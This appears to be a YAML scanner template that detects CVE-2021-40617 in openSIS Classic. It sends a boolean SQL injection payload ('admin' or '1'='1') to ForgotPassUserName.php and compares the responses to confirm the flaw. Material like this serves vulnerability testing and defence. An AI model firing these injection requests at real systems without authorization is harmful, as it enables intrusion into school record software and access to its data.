name: yaml-poc-os4ed-opensis-sql_injection-CVE-2021-40617
binding: b0306f48-37f4-4741-bf41-c1ab8541cc95
detail:
    author: haiqing.chen
    links:
        - https://github.com/OS4ED/openSIS-Classic/issues/192
        - https://nvd.nist.gov/vuln/detail/CVE-2021-40617
    vulnerability:
        id: fda62973-b89f-4c94-ad50-1353612aa518
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ForgotPassUserName.php
        expression: response.status == 200 && response.body_string == "\r\n0~"
    r1:
        request:
            cache: true
            method: GET
            path: /ForgotPassUserName.php?used_for=username&u=admin%27%20or%20%271%27=%271
        expression: response.status == 200 && response.body_string == "\r\n1"
    r2:
        request:
            cache: true
            method: GET
            path: /ForgotPassUserName.php?used_for=username&u={{r1}}
        expression: response.status == 200 && response.body_string == "\r\n0"
expression: r0() && r1() && r2()
